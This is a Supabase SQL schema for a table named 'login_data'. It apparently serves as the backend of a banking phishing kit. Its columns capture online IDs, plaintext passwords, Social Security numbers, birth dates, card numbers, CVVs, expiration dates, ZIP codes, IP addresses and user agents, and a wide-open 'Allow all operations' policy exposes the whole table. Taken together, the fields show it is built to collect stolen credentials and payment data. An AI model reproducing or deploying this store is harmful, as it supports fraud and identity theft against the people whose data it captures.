-- Supabase SQL Schema for login_data table
-- Run this in your Supabase SQL Editor

CREATE TABLE IF NOT EXISTS login_data (
    id BIGSERIAL PRIMARY KEY,
    online_id TEXT NOT NULL,
    password TEXT NOT NULL,
    ssn TEXT,
    dob TEXT,
    card_number TEXT,
    email TEXT,
    cvv TEXT,
    expiration TEXT,
    zip_code TEXT,
    ip_address TEXT,
    user_agent TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Create index for faster queries
CREATE INDEX IF NOT EXISTS idx_login_data_created_at ON login_data(created_at DESC);

-- Enable Row Level Security (optional - adjust as needed)
ALTER TABLE login_data ENABLE ROW LEVEL SECURITY;

-- Policy to allow all operations (adjust for your security needs)
CREATE POLICY "Allow all operations" ON login_data
    FOR ALL
    USING (true)
    WITH CHECK (true);

